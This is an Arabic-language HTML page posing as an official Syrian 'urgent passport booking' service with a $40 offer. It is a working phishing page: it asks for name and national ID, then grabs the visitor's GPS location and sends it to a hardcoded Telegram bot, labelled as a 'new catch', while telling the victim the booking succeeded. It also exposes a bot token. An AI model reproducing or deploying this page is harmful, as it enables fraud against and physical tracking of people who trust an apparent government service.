<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>منصة حجز دور جواز السفر المستعجل</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; text-align: center; padding: 20px; }
        .form-container { background: white; max-width: 400px; margin: auto; padding: 20px; border-radius: 10px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
        h2 { color: #d32f2f; }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { background-color: #2e7d32; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
    </style>
</head>
<body>
    <div class="form-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Coat_of_arms_of_Syria.svg/1200px-Coat_of_arms_of_Syria.svg.png" width="80">
        <h2>منصة الجواز السفر المستعجل</h2>
        <p>عرض خاص: 40$ فقط للحجز الفوري</p>
        <input type="text" placeholder="الاسم الكامل" id="name">
        <input type="number" placeholder="الرقم الوطني" id="id">
        <button onclick="getLocation()">تقديم الطلب وتأكيد الحجز</button>
    </div>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendData);
            } else {
                alert("يرجى تفعيل نظام الموقع (GPS) لإكمال الطلب بنجاح.");
            }
        }

        function sendData(position) {
            let lat = position.coords.latitude;
            let lon = position.coords.longitude;
            let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
            let chat_id = "7214473798";
            let msg = `🚨 صيد جديد (نصاب الجوازات)!\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
            
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${msg}`);
            alert("تم استلام طلبك بنجاح، سيتم التواصل معك عبر الواتساب.");
        }
    </script>
</body>
</html>
